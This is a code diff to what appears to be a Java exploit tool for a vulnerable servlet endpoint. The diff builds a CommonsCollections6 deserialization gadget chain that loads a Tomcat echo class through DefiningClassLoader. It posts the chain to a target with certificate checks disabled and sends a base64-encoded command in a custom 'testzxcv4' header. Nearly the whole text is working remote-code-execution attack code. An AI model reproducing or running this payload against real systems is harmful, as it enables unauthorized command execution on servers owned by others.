@@ -13,6 +13,7 @@ import javafx.scene.control.TextArea;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.ObjectOutputStream;
 import java.net.ConnectException;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -104,7 +105,11 @@ public class DeleteServlet extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             // 发送请求
-            byte[] postData = Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4}));
+//            byte[] postData = Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4_TEST}));
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject("yyds");
+            oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4_TEST}));
             HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
@@ -112,10 +117,10 @@ public class DeleteServlet extends VulnBase {
 
             // 设置请求头
             exec_conn.setRequestProperty("Content-Type", "application/octet-stream");
-            exec_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
+            exec_conn.setRequestProperty("Content-Length", String.valueOf(baos.toByteArray().length));
             exec_conn.setRequestProperty("testzxcv4", flag + Util.byteCodeToBase64(Config.CMD.getBytes()));
 
-            HttpUtil.post(exec_conn, postData);
+            HttpUtil.post(exec_conn, baos.toByteArray());
 
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
